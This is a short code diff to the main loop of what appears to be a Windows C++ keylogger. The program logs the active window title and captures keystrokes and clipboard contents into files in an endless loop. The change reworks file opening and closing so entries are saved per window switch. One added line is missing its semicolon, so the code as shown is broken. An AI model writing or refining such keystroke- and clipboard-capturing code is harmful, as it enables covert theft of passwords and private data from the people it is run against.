@@ -31,11 +31,13 @@ int main(int argc, char * argv[])
 		logFile.open(LogPath.c_str() , fstream::app);
 		logFile << "\n \n   " << date << '\n'
 			<< "APP: " << handle << '\n';
+		logFile.close();
 		while (true) {
 			if (handle != k.GetWindowTitle()) {
-				Sleep(100);
+				logFile.open(LogPath.c_str(), fstream::app)
 				logFile << "\n \nAPP: " << k.GetWindowTitle() << '\n';
 				handle = k.GetWindowTitle();
+				logFile.close();
 			}
 			k.OEMkeys(logFile);
 			k.AZkeys(logFile);
@@ -43,7 +45,6 @@ int main(int argc, char * argv[])
 			k.SpecialKeys(logFile);
 			cp.GetClipboard(clipFile);
 		}
-		logFile.close();
 	}
 	system("pause");
 	return 0;
